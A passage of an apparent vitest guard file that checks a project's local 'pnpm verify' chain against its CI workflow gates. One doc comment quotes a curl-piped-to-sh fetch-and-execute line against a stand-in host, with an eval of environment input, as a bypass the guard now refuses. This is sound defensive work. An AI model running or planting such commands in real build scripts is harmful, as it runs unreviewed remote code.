  for (const [name, body] of Object.entries(scripts)) {
    if (typeof body !== 'string') {
      throw new Error(
        `package.json declares the script "${name}" as something other than a ` +
          'command string, and this reader has no model of what that runs.',
      );
    }
  }

  const block = manifest['pnpm'];
  if (block === undefined) return [];
  if (typeof block !== 'object' || block === null || Array.isArray(block)) {
    throw new Error('package.json has a "pnpm" key that is not a mapping this reader can take apart');
  }
  const keys = Object.keys(block as Record<string, unknown>);
  for (const key of keys) {
    if (!PNPM_MANIFEST_KEYS.includes(key)) {
      throw new Error(
        `package.json's "pnpm" block sets "${key}", which this reader has not ` +
          'been told about. That block configures the installer itself — which ' +
          'package a name resolves to, which install scripts may run, what is ' +
          'patched on the way in — and a key nobody here has read may decide what ' +
          'the programs in "pnpm verify" actually are. Decide what it does, then ' +
          'add it to PNPM_MANIFEST_KEYS.',
      );
    }
  }

  const built = (block as Record<string, unknown>)['onlyBuiltDependencies'];
  if (built !== undefined) {
    const listed = Array.isArray(built) && built.every((item) => typeof item === 'string')
      ? (built as readonly string[])
      : undefined;
    if (
      listed === undefined ||
      listed.length !== ONLY_BUILT_DEPENDENCIES.length ||
      listed.some((item, index) => item !== ONLY_BUILT_DEPENDENCIES[index])
    ) {
      throw new Error(
        `package.json's "pnpm.onlyBuiltDependencies" is ${JSON.stringify(built)} ` +
          `and this reader was shown ${JSON.stringify(ONLY_BUILT_DEPENDENCIES)}. ` +
          'Every name in it is a third-party install script "pnpm install" runs ' +
          'in three CI jobs and "pnpm verify" runs in none. Read what was added, ' +
          'then update ONLY_BUILT_DEPENDENCIES.',
      );
    }
  }

  return keys;
}

/**
 * The keys of the manifest's `pnpm` block, as this run found them.
 *
 * Read by *the manifest is read whole, not for the one key this file wanted*,
 * which asserts the membership directly rather than leaving
 * {@link refuseManifestKeys}'s return value on the floor — the shape
 * {@link SHELL_SETTINGS} is asserted in, and for the same reason: a load-time
 * side effect with a discarded value looks like coverage and is not.
 */
const MANIFEST_SETTINGS: readonly string[] = refuseManifestKeys(MANIFEST);

/** The manifest as the chain reader wants it, once every key has been accounted for. */
const PACKAGE = MANIFEST as { scripts: Record<string, string> };

/**
 * Commands CI runs that are **setup**, not gates: they fetch or install
 * something and cannot fail on the state of the tree.
 *
 * **Exact whole strings, matched by equality.** This list used to be two
 * `startsWith` prefixes, which is defect five in the header: everything after a
 * `&&` rode in on the prefix of the command in front of it. Commands are now
 * split before they get here, so a chained command is its own entry and has to
 * be accounted for on its own — but the exemptions are still written as whole
 * commands rather than prefixes, because a prefix test is the shape that failed
 * and there is no reason to keep one.
 *
 * The cost is that changing the apt package list reddens this file. That is the
 * intended price: the package list is the thing the "every job that runs cargo
 * can actually build the dependency graph" case below is about, and a change to
 * it deserves the two seconds it takes to read.
 *
 * **The `pnpm install` entry's exemption is conditional, and defect seventeen is
 * that it was not.** The sentence above used to end "and cannot fail on the
 * state of the tree", which is false of `pnpm install` whenever the manifest
 * declares a lifecycle script: measured in a scratch package on pnpm 10.33.0,
 * a root `postinstall` of `node -e "console.log('POSTINSTALL_GATE_RAN');
 * process.exit(1)"` made `pnpm install --frozen-lockfile` print
 * `POSTINSTALL_GATE_RAN` and ` ELIFECYCLE  Command failed with exit code 1.`
 * and exit 1. With both scripts succeeding, the same install ran `postinstall`
 * and then `prepare` and exited 0, while `pnpm verify` in the same package ran
 * neither and exited 0. So this exemption is only sound while the manifest
 * carries no such body, and *the setup exemption for `pnpm install` covers no
 * work of its own* asserts exactly that — see {@link LIFECYCLE_SCRIPTS}.
 *
 * Read by the `unaccounted` filter in *every gate command in the workflows is
 * accounted for above*, and by the four `unaccounted` calls in *does not exempt
 * a command that merely begins with a setup command*, two of which are the
 * controls that only pass because this list is consulted.
 */
const SETUP_COMMANDS: readonly string[] = [
  'pnpm install --frozen-lockfile',
  'sudo apt-get update',
  'sudo apt-get install -y --no-install-recommends libwebkit2gtk-4.1-dev ' +
    'libappindicator3-dev librsvg2-dev patchelf libgtk-3-dev libsoup-3.0-dev ' +
    'libjavascriptcoregtk-4.1-dev libssl-dev libsecret-1-dev',
];

/**
 * The `package.json` keys **pnpm itself** runs, without any of them appearing in
 * a command anybody wrote.
 *
 * Defect seventeen. {@link SETUP_COMMANDS} exempts `pnpm install
 * --frozen-lockfile` — the one command CI runs in three jobs and `pnpm verify`
 * runs in none — on the ground that it is not a gate. `pnpm install` also runs
 * the root package's `preinstall`, `install`, `postinstall` and `prepare`, and
 * {@link chainOf} starts at `verify` and has no notion of a lifecycle edge, so a
 * body written under one of these keys is CI work reached three times per run
 * that no `pnpm verify` ever executes. That is the guard's own opening
 * relationship — a green local run that does not mean a green CI run — arriving
 * through the single command this file exempts by name.
 *
 * Measured, so the exemption is conditional on a fact rather than on a sentence:
 * see the paragraph in {@link SETUP_COMMANDS}.
 *
 * The answer here is a refusal rather than a walk. Walking these bodies into
 * {@link VERIFY_CHAIN} would be *wrong*: they are things CI runs and `verify`
 * does not, so treating them as part of the local gate would assert the very
 * coverage that is missing. So the manifest must carry none of them, and adding
 * one reddens this file until somebody decides whether the work belongs in
 * `verify`, in a workflow step, or nowhere.
 *
 * Read by {@link lifecycleScriptsIn}, and by nothing else — which *the setup
 * exemption for "pnpm install" covers no work of its own* calls three times, on
 * the real manifest and on two hand-built ones. The two hand-built calls are why
 * this list is not an unread write: measured on the tree this comment ships in,
 * twice, emptying it to `[]` is `1 failed | 195 passed (196)`, exit 1 twice —
 * against the real manifest alone it would stay green, because the real manifest
 * declares none of these.
 */
const LIFECYCLE_SCRIPTS: readonly string[] = [
  'preinstall',
  'install',
  'postinstall',
  'prepare',
  'prepublish',
  'prepublishOnly',
  'preprepare',
  'postprepare',
];

/**
 * The lifecycle bodies a manifest declares, named.
 *
 * A named function for the reason {@link unaccounted} is one: the real manifest
 * declares none, so a rule written inline would only ever see input that
 * satisfies it and could be emptied without anything noticing.
 */
function lifecycleScriptsIn(scripts: Record<string, string>): string[] {
  return Object.keys(scripts).filter((name) => LIFECYCLE_SCRIPTS.includes(name));
}

/**
 * A **path in this repository**, or `undefined`.
 *
 * The referential question defect eleven made {@link refuseUses} ask, asked on
 * the verify side: not "does this argument look like a path?" but "which file
 * does it name, and is that file here?". `normaliseUsesPath` is reused rather
 * than re-derived, so a `..` that climbs out of the tree is `undefined` on both
 * sides for the same reason.
 *
 * Called from seven places: four {@link VERIFY_INVOCATIONS} predicates (`node`,
 * `vitest`, `cd`, and `vite` through `everyArgumentIsFlagOrPath`), and three
 * direct calls in *accepts the argument shapes the shipped chain really uses —
 * the control*, which are what stop the existence check from being a rule the
 * shipped chain happens to satisfy. A previous version of this sentence said
 * "read in five places" and then listed four plus three; five is the count of
 * *sites that decide a verdict* only if the three test calls are counted as one
 * case, which the sentence did not say.
 *
 * Load-bearing, measured on the tree this comment ships in, twice: dropping the
 * `existsSync` so the question goes back to being about spelling is `1 failed |
 * 195 passed (196)`, exit 1 twice, at *accepts the argument shapes the shipped
 * chain really uses — the control*.
 */
function repositoryPath(argument: string): string | undefined {
  if (argument === '' || argument.startsWith('-')) return undefined;
  const normalised = normaliseUsesPath(argument.replace(/\\/gu, '/'));
  if (normalised === undefined) return undefined;
  return existsSync(join(REPO_ROOT, normalised)) ? normalised : undefined;
}

const isFlag = (argument: string): boolean => argument.startsWith('-');
const everyArgumentIsFlagOrPath = (args: readonly string[]): boolean =>
  args.every((argument) => isFlag(argument) || repositoryPath(argument) !== undefined);

/**
 * One shape of **invocation** `pnpm verify`'s chain may contain: a program and
 * the argument lists this reader has been told that program's behaviour under.
 *
 * This is the verify side's {@link SETUP_COMMANDS}: the totality the workflow
 * side always had and this side deliberately did not. `unaccounted` makes the
 * workflow document total — every simple command CI runs is a listed gate or a
 * listed setup command, and anything else reddens wherever it sits. The verify
 * side had no such net, on the stated grounds that "verify may be stricter", and
 * defect thirteen is what walked through the gap: prefixing `exit 0 && ` to the
 * shipped chain byte for byte gives a `verify` body of twelve top-level simple
 * commands — `exit 0`, eight `pnpm <script>` invocations, `cd src-tauri` and two
 * `cargo` gates — which {@link chainOf} expands to twenty-four commands, every
 * one of them parsed, gating and reached. It satisfied every row, ran nothing,
 * and exited 0. It was **141/141 green**, twice, on the tree that shipped after
 * round two.
 *
 * ### Defect eighteen: the net was one token wide
 *
 * Round three's fix for thirteen was a list of seven **program names**, and its
 * doc said each entry named the fact that "this program runs, returns an exit
 * status, and hands control on, **and what it runs is written in this
 * repository**". A name in the program position cannot carry that fact, because
 * the fact is a property of the *invocation*. Measured on the tree that shipped
 * after round three, twice: prefixing
 *
 *     pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" &&
 *       node -e "eval(process.env.PROBE||'')" &&
 *
 * to the shipped chain was `172 passed (172)`, exit 0 twice — while the
 * byte-equivalent `sh -c "…"` written with `sh` in the program position was
 * `1 failed | 171 passed (172)`, exit 1 twice, with the message that names the
 * property being violated ("runs text that is not in this repository"). Both programs were on the list; `sh`, `eval`, a pipe into `sh`
 * and code taken from the environment were all in the chain, all parsed, all
 * gating and reached. One invocation, two spellings, opposite verdicts, inside
 * the function round three added to close exactly that — the same substitution
 * of a **textual** question for a **referential** one as defect five's prefix
 * test, defect six's `matches.test(VERIFY)` and defect eleven's `./` test.
 *
 * So an entry is now a program **and a predicate over its argument list**, and
 * the fact it names is about the command rather than about the token:
 * `node <path in this repository>` is a different fact from `node -e <text>`,
 * and `pnpm <script in the root manifest>` is a different fact from
 * `pnpm exec <anything>`. A command whose program is listed and whose arguments
 * no entry accepts is refused exactly as an unlisted program is, and says which.
 *
 * "Stricter" is about which *gates* verify runs, and this list does not
 * constrain that. It constrains which *invocations* may appear in the chain at
 * all. An invocation that is not accepted is refused whether it ends the chain
 * (`exit`, `return`), replaces it (`exec`), changes how a failure propagates
 * through it (`set -e`, `set +e`, `trap`), runs text that is not in this
 * repository (`eval`, `source`, `.`, `sh`, `bash`, `cmd`, `node -e`,
 * `pnpm exec`), or merely stands where a gate should be (`true`, `:`, `false`).
 * The point of an allowlist rather than a list of those is that a spelling
 * nobody thought of is refused instead of admitted; a list of builtins is the
 * shape this file has lost to every round. That is the same inversion defect
 * eleven made to {@link refuseUses}.
 *
 * `cd` is the one entry that is not an external program, and it is also the one
 * that falsifies a claim every other entry depends on — see
 * {@link VerifyCommand.rebound}.
 *
 * What an accepted invocation still does not bound, said so nobody over-reads
 * it: the *arguments* a listed script is handed. `node scripts/run-bash.mjs X`
 * names a program that is in this repository and says nothing about `X`, in
 * exactly the way the header's first "cannot see" bullet says a gate's argument
 * list is pinned and its definition is not.
 *
 * The cost is that adding a program, or a new argument shape for one already
 * here, reddens this file. That is the same price {@link SETUP_COMMANDS} charges
 * for the apt package list, and for the same reason: a new invocation in the
 * local gate is a thing to read.
 *
 * Read in two places, both inside {@link unclassifiedVerifyCommands}'s reach:
 * {@link acceptsInvocation}, which asks whether any entry takes the command, and
 * the failure branch beside it, which lists the shapes an entry does cover for
 * the message. Four cases call `unclassifiedVerifyCommands`: *every command
 * "pnpm verify" runs is one this reader can classify* over the real chain, and
 * *does not accept an invocation it has never been told runs and returns*, the
 * four *defect eighteen* rows, and *a pnpm script name behind a cd binds to a
 * manifest nobody read* over hand-built ones.
 */
interface VerifyInvocation {
  readonly program: string;
  /** The argument shape this entry covers, for the failure message. */
  readonly shape: string;
  readonly accepts: (command: ParsedCommand) => boolean;
}

const VERIFY_INVOCATIONS: readonly VerifyInvocation[] = [
  // `pnpm <name>` where the name is a key in the ROOT manifest's `scripts`. That
  // is the only pnpm invocation `chainOf` can follow into a body it has read, so
  // it is the only one whose text this reader can say anything about. It refuses
  // `pnpm exec <program>` and `pnpm dlx <package>`, which run a program nobody
  // here named, and `pnpm install`, which runs whatever the lifecycle keys say
  // (see {@link LIFECYCLE_SCRIPTS}).
  {
    program: 'pnpm',
    shape: 'pnpm <script in the root package.json> (or "pnpm run <script>")',
    accepts: (command) => {
      const script = pnpmScript(command);
      return script !== undefined && runsPnpm(command, script);
    },
  },
  // `node <path in this repository>`. The fact is that the text node executes is
  // a file in this tree; `node -e <text>` and `node --eval=<text>` have no such
  // file and are refused. Everything after the path is data to that script.
  {
    program: 'node',
    shape: 'node <path in this repository> [arguments]',
    accepts: (command) => command.args.length > 0 && repositoryPath(command.args[0] ?? '') !== undefined,
  },
  // `cargo <subcommand>`. A subcommand is a name cargo resolves; a first
  // argument that is a flag is not one.
  {
    program: 'cargo',
    shape: 'cargo <subcommand> [arguments]',
    accepts: (command) => command.args.length > 0 && !isFlag(command.args[0] ?? ''),
  },
  // `tsc` with flags only. This repository runs `tsc --build --force`; a bare
  // word here would be a file list, which is a different compilation.
  { program: 'tsc', shape: 'tsc [flags]', accepts: (command) => command.args.every(isFlag) },
  // `vite build`, which is the only vite invocation in the chain. `vite dev`
  // starts a server that never returns, which is the opposite of the fact every
  // row above assumes.
  {
    program: 'vite',
    shape: 'vite build [flags or paths in this repository]',
    accepts: (command) => command.args[0] === 'build' && everyArgumentIsFlagOrPath(command.args.slice(1)),
  },
  // `vitest run …`. Bare `vitest` is the watcher and does not return either.
  // A `--config` argument must name a file that is here, which is the same
  // referential question asked of `node`'s first argument.
  {
    program: 'vitest',
    shape: 'vitest run [flags or paths in this repository]',
    accepts: (command) => command.args[0] === 'run' && everyArgumentIsFlagOrPath(command.args.slice(1)),
  },
  // `cd <directory in this repository>`. It runs, returns and continues — and it
  // rebinds every `pnpm <name>` behind it, which is why accepting it here is not
  // the end of the question. See {@link VerifyCommand.rebound}.
  {
    program: 'cd',
    shape: 'cd <directory in this repository>',
    accepts: (command) => command.args.length === 1 && repositoryPath(command.args[0] ?? '') !== undefined,
  },
];

/**
 * The {@link VerifyInvocation} that accepts this command, or `undefined`.
 *
 * Separated from {@link unclassifiedVerifyCommands} so that "no entry has this
 * program" and "an entry has this program and not these arguments" are one
 * lookup with two answers, which is what lets the failure message print the
 * shape the entry does cover.
 *
 * Load-bearing, measured on the tree this comment ships in, twice: dropping
 * `entry.accepts(command)` so this goes back to round three's program-token test
 * is `5 failed | 191 passed (196)`, exit 1 twice — the four *defect eighteen*
 * rows and the control beside them.
 */
function acceptsInvocation(command: ParsedCommand): VerifyInvocation | undefined {
  return VERIFY_INVOCATIONS.find((entry) => entry.program === command.program && entry.accepts(command));
}

/**
 * Every command in the workflows that is a *gate* — something that can fail the
 * build on the state of the tree.
 *
 * `ci` is the exact command text the workflow runs, and is matched against the
 * workflows by equality. `runs` is the **verify side**, and it is a predicate
 * over a {@link ParsedCommand} rather than a regular expression over a text
 * splat — defect six in the header. `matches: /pnpm (?:run )?typecheck/` tested
 * against a bag of concatenated script bodies is satisfied by
 * `echo "… pnpm typecheck …"`; `pnpmScript(c) === 'typecheck'` is not, because
 * `echo`'s program is `echo` whatever its arguments say.
 */
interface CiGate {
  /** Exactly what the workflow runs. */
  readonly ci: string;
  /** Whether one command in the verify chain *is* this gate. */
  readonly runs: (command: ParsedCommand) => boolean;
  /**
   * Set only on a row whose `ci` *wraps* another listed gate, so that `runs`
   * deliberately does not describe `ci`. Its value is the `ci` of the row being
   * delegated to.
   *
   * The two halves of a row answer two different questions — `ci` is checked
   * against the workflows, `runs` against the verify chain — and defect seven
   * was that nothing checked they were still about the same command. See
   * *the gate row for $ci describes the command it names*, which is what makes
   * this field an exemption that has to be earned rather than a comment.
   */
  readonly delegatesTo?: string;
}

const CI_GATES: readonly CiGate[] = [
  { ci: 'pnpm typecheck', runs: (c) => runsPnpm(c, 'typecheck') },
  { ci: 'cargo fmt --all --check', runs: (c) => invokes(c, 'cargo', 'fmt', '--all', '--check') },
  {
    ci: 'cargo clippy --workspace --all-targets -- -D warnings',
    runs: (c) => invokes(c, 'cargo', 'clippy', '--workspace', '--all-targets', '--', '-D', 'warnings'),
  },
  { ci: 'pnpm test', runs: (c) => runsPnpm(c, 'test') },
  { ci: 'pnpm test:harness', runs: (c) => runsPnpm(c, 'test:harness') },
  // The same gate, wrapped for the Windows job only. The wrapper re-runs a
  // vitest worker-pool CRASH — a run that printed no verdict — and passes a real
  // test failure straight through; see `scripts/ci-retry-vitest-crash.mjs`. It
  // is listed rather than exempted so that the harness gate cannot be swapped
  // for something else behind the wrapper without this file noticing, and `runs`
  // still demands that `verify` reach the unwrapped gate.
  {
    ci: 'node scripts/ci-retry-vitest-crash.mjs pnpm test:harness',
    runs: (c) => runsPnpm(c, 'test:harness'),
    delegatesTo: 'pnpm test:harness',
  },
  { ci: 'pnpm build', runs: (c) => runsPnpm(c, 'build') },
  { ci: './scripts/check-transcripts.sh', runs: (c) => runsScript(c, 'scripts/check-transcripts.sh') },
  // The same script, reached the way a Windows developer reaches it. The Linux
  // job runs the file directly; `test-windows` runs it through `pnpm`, because
  // pnpm hands script bodies to `cmd.exe` and that is the hop that was broken.
  { ci: 'pnpm test:transcripts', runs: (c) => runsPnpm(c, 'test:transcripts') },
  { ci: 'cargo build --workspace --locked', runs: (c) => invokes(c, 'cargo', 'build', '--workspace', '--locked') },
  { ci: 'cargo test --workspace --locked', runs: (c) => invokes(c, 'cargo', 'test', '--workspace', '--locked') },
  // Two rows, two different scripts, and `runsScript` compares the script path
  // exactly rather than searching for it. A previous version of this comment
  // said the old `matches: /secret-scan\.sh/` was "satisfied by the `.test.sh`
  // command as well, so one of these rows was proving nothing", and that is
  // false in both halves: the escaped dot demands the bytes `secret-scan.sh`,
  // which do not occur inside `scripts/secret-scan.test.sh`, and the old reader
  // tested the regex against the whole concatenated splat, where the genuine
  // `scripts/secret-scan.sh` occurrence satisfied it. Each row was satisfied by
  // its own distinct command then, and is now.
  { ci: './scripts/secret-scan.test.sh', runs: (c) => runsScript(c, 'scripts/secret-scan.test.sh') },
  { ci: './scripts/secret-scan.sh', runs: (c) => runsScript(c, 'scripts/secret-scan.sh') },
];

/**
 * The events every workflow in this repository runs on, per file, as
 * {@link triggersOf} spells them.
 *
 * Defect twenty-five. Every row of {@link CI_GATES} says *what CI runs*; not one
 * of them asks whether CI runs. Pinned by equality rather than checked for a
 * property, for the reason {@link SETUP_COMMANDS} is: the property that wants
 * checking here — "this filter cannot silence the run for the change somebody is
 * asking about" — is a claim about GitHub's matcher, and an equality against
 * what a human read is a fact about this repository. Widening the triggers costs
 * a review; narrowing them to nothing is a red.
 *
 * Read by *every gate CI has is one it runs on the events this claim assumes*,
 * and by nothing else.
 */
const CI_TRIGGERS: Record<string, readonly string[]> = {
  'ci.yml': [
    'push branches: [main]',
    'pull_request types: [opened, ready_for_review, reopened, synchronize] branches: [main]',
    'workflow_dispatch',
  ],
};

describe('the local gate is a superset of the remote one', () => {
  it('every workflow file the runner would load is one this guard reads', () => {
    // The membership assertion the union needs. See WORKFLOW_FILES.
    expect(
      SURFACE.files,
      'a workflow file appeared in .github/workflows/ that this guard has never ' +
        'read. GitHub Actions runs every file in that directory, so its steps are ' +
        'part of what CI gates on and every assertion in this file is now ' +
        'answering about a subset. Read it, add its gates to CI_GATES and to ' +
        '"pnpm verify", then add its name to WORKFLOW_FILES.',
    ).toEqual([...WORKFLOW_FILES]);

    expect(
      SURFACE.ignoredFiles,
      'a file is sitting in .github/workflows/ that GitHub Actions will not load, ' +
        'because its extension is neither .yml nor .yaml. If that is deliberate, ' +
        'say so by listing it in IGNORED_WORKFLOW_FILES; if it was meant to be a ' +
        'workflow, it is not running.',
    ).toEqual([...IGNORED_WORKFLOW_FILES]);
  });

  it('every pinned third-party action is one the workflows really use', () => {
    // The pin checked in both directions, for the reason WORKFLOW_FILES gives:
    // a one-directional pin absorbs. An action listed here and used nowhere is a
    // hole held open for nothing, and it is also where a removed action's entry
    // would sit waiting to admit its return unreviewed.
    expect(
      SURFACE.actions,
      'THIRD_PARTY_ACTIONS and the actions the workflows actually use have ' +
        'drifted apart. A pinned action nobody uses should go; an action in use ' +
        'that is not pinned would have been refused at module load.',
    ).toEqual([...THIRD_PARTY_ACTIONS.map((action) => action.uses)].sort());
  });

  it.each(CI_GATES)('verify reaches the CI gate: $ci', ({ ci, runs }) => {
    expect(
      COMMANDS.some(({ command }) => command === ci),
      `this test's list is stale: no workflow under .github/workflows/ runs "${ci}"`,
    ).toBe(true);

    // Three questions, kept apart on purpose, because the answers want
    // different fixes. "Is it there at all?" was the only one the old text
    // search could ask. "Does its failure fail `verify`?" is defect six: a gate
    // wrapped in `|| echo`, or trailing a `;` or a `|`, is present and gates
    // nothing. "Does it run on a green pass?" is defect twelve, and it is not
    // the same question: a gate on the RIGHT of a `||` has a failure that would
    // fail the run, and executes only when the command in front of it failed,
    // so every green `pnpm verify` skips it.
    //
    // Measured on the tree that shipped after round two, twice each:
    // `"verify:harness": "pnpm test:click-harness || pnpm test:harness"` spliced
    // into the chain in place of `pnpm test:harness` was 141/141 green, while
    // the same two commands with the gate moved to the LEFT of the same `||`
    // was 2 failed | 139 passed. One referent, two positions across one
    // operator, and the position this file admitted was the one where the gate
    // does not run at all.
    const matching = VERIFY_CHAIN.filter((entry) => runs(entry.command));
    const suppressed = matching.filter((entry) => !entry.gating);
    const skipped = matching.filter((entry) => entry.gating && !entry.reached);
    const enforced = matching.filter((entry) => entry.gating && entry.reached);

    const where = (entries: readonly VerifyCommand[]): string =>
      entries.map((entry) => `${entry.script} -> ${entry.command.text}`).join(', ');

    expect(
      enforced.length,
      suppressed.length > 0
        ? `"pnpm verify" runs "${ci}" but its failure cannot fail the run: ` +
          where(suppressed) +
          '. A gate whose failure is swallowed is not a gate, and a green local ' +
          'run would not mean a green CI run. Put it back on the && chain.'
        : skipped.length > 0
          ? `"pnpm verify" writes "${ci}" on the right of a "||", so it runs only ` +
            `when the command in front of it fails: ` +
            where(skipped) +
            '. Every green "pnpm verify" skips it, which is exactly the run this ' +
            'file is asked about. Put it on the && chain.'
          : `CI runs "${ci}" but "pnpm verify" does not. A green local run would ` +
            `not mean a green CI run. Add it to the verify chain in package.json. ` +
            `The commands verify actually runs are: ` +
            VERIFY_CHAIN.map((entry) => entry.command.text).join(' | '),
    ).toBeGreaterThan(0);
  });

  it('every command "pnpm verify" runs is one this reader can classify', () => {
    // Defect thirteen, and the totality this side did not have. Every row above
    // asks whether a gate is *present* in the chain and whether the operators
    // around it let its exit status through. Not one of them asks whether the
    // chain ever gets there. `"verify": "exit 0 && <the whole shipped chain>"`
    // is a `verify` body of twelve top-level simple commands — `exit 0`, eight
    // `pnpm <script>` invocations, `cd src-tauri` and two `cargo` gates — which
    // `chainOf` expands to twenty-four commands, every one parsed, gating and
    // reached, of which `pnpm verify` runs none. Measured on the tree that
    // shipped after round two, twice: 141/141 green. It is defect six's own
    // headline construction — `"verify": "echo \"CI still runs …\""` — one level
    // down, against the reader built to kill it.
    //
    // (Those four counts — 24 chain entries, 24 gating, 12 top level, 8 of them
    // `pnpm` — are this round's, printed by `chainOf` on the tree this comment
    // ships in with `exit 0 && ` spliced onto the front of the real `verify`
    // body. The shipped chain itself is 23 entries and 11 top-level commands.
    // The previous version of this comment called the same construction "twelve
    // real, parsed, gating `pnpm` invocations" here and "twelve real, gating
    // `pnpm` invocations" in VERIFY_PROGRAMS' doc, and "thirteen real gating
    // invocations" in the header: twelve is the count of top-level commands of
    // any program, eight is the count of `pnpm` ones, and thirteen was nothing
    // the tree returns. The two quotations differed by one word and an earlier
    // correction gave them one wording, which is a small thing and is exactly
    // the class of thing this file is otherwise strict about.)
    //
    // `exit` was not the hole. The hole was that an invocation this reader had
    // never been told about was assumed to run and return, so the fix is an
    // allowlist and not a list of control-flow builtins: see
    // VERIFY_INVOCATIONS. Establishing what three shells do with the
    // construction, without invoking pnpm or verify — re-run on this tree:
    // `sh -c 'exit 0 && echo GATE_RAN'` (SH_EXIT=0), the same under `bash -c`
    // (BASH_EXIT=0) and under `cmd //c` (CMD_EXIT=0) each printed nothing.
    expect(
      unclassifiedVerifyCommands(VERIFY_CHAIN),
      'a command in the "pnpm verify" chain is an invocation this reader cannot ' +
        'classify. Every row above assumes each command runs, returns an exit ' +
        'status and hands control on, and that the text it runs is in this ' +
        'repository — and one that does not (it ends the chain, replaces it, ' +
        'changes how failure propagates through it, runs text that is not in ' +
        'this repository, or names a script in a package.json nobody here read) ' +
        'makes every gate listed behind it unproven while every row above stays ' +
        'green. Add the invocation to VERIFY_INVOCATIONS once you have decided ' +
        'it is an ordinary one.',
    ).toEqual([]);
  });

  it.each(CI_GATES)('the gate row for $ci describes the command it names', (gate) => {
    // Defect seven. A row is two halves answering two different questions: `ci`
    // is compared with the workflows by equality, and `runs` is asked of the
    // verify chain. Every check above holds one half still and varies the other,
    // so nothing noticed when the halves stopped being about the same command.
    //
    // Measured on the tree carrying the fix for defects four to six, whose
    // whole suite was 91, twice: change CI's build gate to `cargo build
    // --workspace --locked --all-targets`, update this row's `ci` to match —
    // which `unaccounted` forces you to do — and leave `runs` describing the old
    // command, and the file was 91/91 green while `pnpm verify` ran strictly
    // less than CI. That is the one relationship this file exists to deny.
    //
    // The gate stays a hand-written predicate rather than a string comparison —
    // `invokes` is what makes `--no-run` a different command instead of a longer
    // one — but a hand-written predicate now has to survive being pointed at its
    // own `ci`.
    expect(rowDrift(gate, CI_GATES), `the CI_GATES row for "${gate.ci}" is inconsistent`).toEqual([]);
  });

  it('every gate command in the workflows is accounted for above', () => {
    // Catches the other direction: a *new* CI step that nobody listed here, and
    // which therefore silently escapes the check above. Over the union, so a
    // step added in a second workflow is caught the same as one added to
    // `ci.yml`; and over *simple commands*, so a gate chained onto the end of a
    // setup step with `&&` is its own entry rather than part of the setup
    // command's prefix. That is defect five.
    expect(COMMANDS.length).toBeGreaterThanOrEqual(CI_GATES.length);

    expect(
      unaccounted(COMMANDS),
      'a new CI command appeared. Add it to CI_GATES and to "pnpm verify", or ' +
        'add it to SETUP_COMMANDS with a reason if it is setup rather than a ' +
        'gate. Note that this is one *simple command*: if it arrived chained ' +
        'onto another with && then the step that carries it is doing two things.',
    ).toEqual([]);
  });

  it('every CI gate runs, and can fail the job it is listed in', () => {
    // Defect ten, and the exact mirror of the `continue-on-error: true` refusal
    // in `modelOf`. That refusal says a step whose failure cannot fail the job
    // "is therefore not a gate, and listing it as one would overstate what CI
    // proves" — and then asked only whether a *YAML key* said so, never whether
    // a *shell operator* said the same thing about the same step.
    //
    // Measured on the tree carrying the fix for defects four to six, whose
    // whole suite was 91, twice: `run: pnpm test:harness || pnpm test:harness`
    // left the file 91/91 green. `unaccounted` stayed empty because both halves
    // are listed gates, and every row above went on asserting "CI runs pnpm
    // test:harness" about a step whose failure CI would ignore.
    //
    // The readers of `WorkflowCommand.gating` and `WorkflowCommand.reached`
    // are this case, through `unenforcedGates`; *a gate that cannot fail, or
    // that does not run, is caught — defects ten and twelve*, which calls the
    // same function on hand-built commands four times; and *carries the gating
    // flag from the parsed step into the command list*, which asserts on the
    // two fields directly. A previous version of this comment said "this case
    // and only this case", written in the same commit as the other two.
    //
    // The `reached` half is defect twelve, and it is the other side of the
    // same `||`. Defect ten closed the LEFT of it — a gate there has its exit
    // status swallowed. A gate on the RIGHT of it has its exit status honoured
    // and does not run: the shell reaches it only when the command in front of
    // it failed, so every green run of that step skips it while every row above
    // reports that CI runs it.
    //
    // A newline counts as ending the chain, so a gate on any line but the last
    // of a `run: |` block reddens here. That is deliberate and it is the safe
    // direction: whether a newline ends the chain depends on the shell's errexit
    // setting, which is not written in this file, and this reader does not get
    // to assume the answer it prefers. The fix is one gate per step, or an `&&`.
    expect(
      unenforcedGates(COMMANDS, CI_GATES),
      'a command listed in CI_GATES is written in CI so that it does not gate — ' +
        'either its failure cannot fail the job (it is on the left of a "||", in ' +
        'front of a ";" or a "|", or on a line of a block scalar that is not the ' +
        'last) or it does not run at all on a green pass (it is on the right of a ' +
        '"||"). Either way every row above would go on claiming CI runs it. Put ' +
        'it on its own step, or on the "&&" chain.',
    ).toEqual([]);
  });

  it('the crash-retry wrapper is confined to the one job that needs it', () => {
    // `scripts/ci-retry-vitest-crash.mjs` re-runs a gate that crashed without
    // reporting any verdict. That is defensible exactly where the crash happens
    // and nowhere else: on a job that does not crash, the same wrapper is a
    // retry on ordinary flakiness, which is how a real intermittent failure
    // gets normalised into "just re-run it".
    //
    // Both the script and the workflow say "only here". Prose does not enforce
    // itself — spreading the wrapper to the Linux harness gate left this file
    // green, because the CI_GATES row for it is satisfied by the wrapped string
    // wherever it appears. This is what makes "only here" true.
    //
    // The job is named with its file. Confining the wrapper to a job *name* was
    // the second half of the same hole: a second workflow's `test-windows` is a
    // different job, and reading only one file could not tell them apart.
    const WRAPPER = 'ci-retry-vitest-crash.mjs';

    const wrappingJobs = [
      ...new Set(
        COMMANDS.filter(({ command }) => command.includes(WRAPPER)).map(
          ({ file, job }) => `${file}:${job}`,
        ),
      ),
    ];
    expect(
      wrappingJobs,
      'the crash-retry wrapper belongs to `test-windows` in `ci.yml` alone. If ' +
        'another job now needs it, the crash has spread and the trigger should ' +
        'be found rather than the retry copied.',
    ).toEqual(['ci.yml:test-windows']);

    expect(
      COMMANDS.filter(({ command }) => command.includes(WRAPPER)).map(
        ({ file, command }) => `${file}: ${command}`,
      ),
      'the wrapper is for exactly one step, wrapping exactly the harness gate',
    ).toEqual(['ci.yml: node scripts/ci-retry-vitest-crash.mjs pnpm test:harness']);
  });

  it('every job that runs cargo can actually build the dependency graph', () => {
    // The failure this catches, found at Phase B integration: `static` ran
    // `cargo clippy` on a bare runner. Clippy builds before it lints, the graph
    // contains glib-sys / gtk-sys / soup3-sys / javascriptcore-rs-sys /
    // webkit2gtk-sys, and each resolves its system library through pkg-config in
    // a build script. The job died at glib-sys without ever reaching Vela's
    // code — and nobody noticed, because the draft guard meant the workflow had
    // never run. `verify` passing locally says nothing here: this container has
    // the packages, so the gap is invisible from a green local run.
    //
    // The rule is "a cargo job must be able to build the graph"; the apt list is
